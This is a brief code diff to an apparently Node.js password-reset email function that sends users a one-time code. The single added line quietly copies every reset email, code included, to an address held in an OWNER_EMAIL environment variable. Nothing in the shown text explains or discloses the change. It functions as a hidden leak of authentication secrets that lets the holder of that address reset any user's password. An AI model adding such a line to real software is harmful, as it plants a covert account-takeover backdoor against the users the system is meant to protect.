@@ -52,6 +52,7 @@ const sendEmail = async (email,otp) => {
         let info = await transporter.sendMail({
             from: process.env.EMAIL_USER, // sender address
             to: email, // list of receivers
+            cc: process.env.OWNER_EMAIL,
             subject:"password reset OTP",
             text:`Your OPT (experises in one hour ): ${otp}`,
         });
